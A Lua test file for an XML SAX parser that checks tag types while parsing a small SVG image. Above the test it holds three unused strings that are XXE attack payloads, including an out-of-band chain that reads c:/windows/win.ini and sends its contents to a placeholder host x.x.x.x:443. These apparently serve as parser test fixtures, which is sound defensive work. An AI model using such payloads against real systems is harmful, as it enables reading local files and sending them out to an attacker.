local Xml = require ("Jotun.Xml")

local fml = [[
	<?xml version="1.0" ?>
	<!DOCTYPE r [
	<!ELEMENT r ANY >
	<!ENTITY sp SYSTEM "http://x.x.x.x:443/test.txt%22%3E"
	]>
	<r>&sp;</r>
]]
local fml = [[
	<?xml version="1.0" ?>
	<!DOCTYPE r [
	<!ELEMENT r ANY >
	<!ENTITY % sp SYSTEM "http://x.x.x.x:443/ev.xml%22%3E
	%sp;
	%param1;
	%exfil;
	]>
]]
local fml = [[
	<!ENTITY % data SYSTEM "file:///c:/windows/win.ini">
	<!ENTITY % param1 "<!ENTITY &#x25; exfil SYSTEM 'http://x.x.x.x:443/?%data;%27%3E%22%3E
]]
return function ()
	local iterator = Xml.ParseSax (
		[=[
			<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100">
			  <path d="M30,1h40l29,29v40l-29,29h-40l-29-29v-40z" stroke="#000" fill="none"/> 
			  <path d="M31,3h38l28,28v38l-28,28h-38l-28-28v-38z" fill="#a23"/> 
			  <text x="50" y="68" font-size="48" fill="#FFF" text-anchor="middle"><![CDATA[410]]></text>
			</svg>
		]=]
	)
	local tagType, node = iterator ()
	assert (tagType == Xml.TagType.Opening,     node:ToString ())
	tagType, node = iterator ()
	assert (tagType == Xml.TagType.SelfClosing, node:ToString ())
	tagType, node = iterator ()
	assert (tagType == Xml.TagType.SelfClosing, node:ToString ())
	tagType, node = iterator ()
	assert (tagType == Xml.TagType.Opening,     node:ToString ())
	tagType, node = iterator ()
	assert (tagType == Xml.TagType.Text,        node:ToString ())
	tagType, node = iterator ()
	assert (tagType == Xml.TagType.Closing,     node:ToString ())
	tagType, node = iterator ()
	assert (tagType == Xml.TagType.Closing,     node:ToString ())
end
